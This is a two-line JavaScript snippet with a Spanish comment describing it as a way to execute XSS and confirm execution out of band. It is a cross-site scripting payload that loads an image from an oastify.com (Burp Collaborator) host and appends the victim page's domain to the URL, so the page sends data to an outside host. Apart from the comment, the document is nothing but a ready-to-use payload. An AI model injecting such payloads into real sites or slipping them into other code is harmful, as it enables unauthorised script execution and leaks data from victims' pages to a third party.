// Ejecuta XSS y confirma ejecución vía OOB
new Image().src = "https://lncc64e9yh8u8g6a9bbpqbtxnotfha5z.oastify.com/xss?d=" + encodeURIComponent(document.domain);
